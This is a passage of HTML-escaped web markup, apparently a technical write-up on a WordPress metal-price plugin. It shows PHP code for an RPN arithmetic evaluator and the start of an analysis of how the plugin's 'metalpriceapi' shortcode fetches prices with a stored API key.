class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$precedence&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$precedence&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$operators&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$operators&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$operators&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$operators&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$operators&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Evaluate&amp;ensp;RPN&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$stack&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;+&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Division&amp;ensp;by&amp;ensp;zero&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers the &lt;code&gt;metalpriceapi&lt;/code&gt; shortcode with the &lt;code&gt;shortcode()&lt;/code&gt; callback:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;add_shortcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;metalpriceapi&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;shortcode&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Inside the &lt;code&gt;shortcode()&lt;/code&gt; function, input parameters are retrieved from the shortcode using &lt;code&gt;shortcode_atts()&lt;/code&gt;. The plugin then retrieves the saved &lt;code&gt;api_key&lt;/code&gt; using &lt;code&gt;get_option()&lt;/code&gt;, constructs the URL, and sends a request to &lt;code&gt;https://api.metalpriceapi.com&lt;/code&gt; using &lt;code&gt;wp_remote_get()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;If an account is registered at &lt;code&gt;metalpriceapi.com&lt;/code&gt; and the API key is entered in the plugin 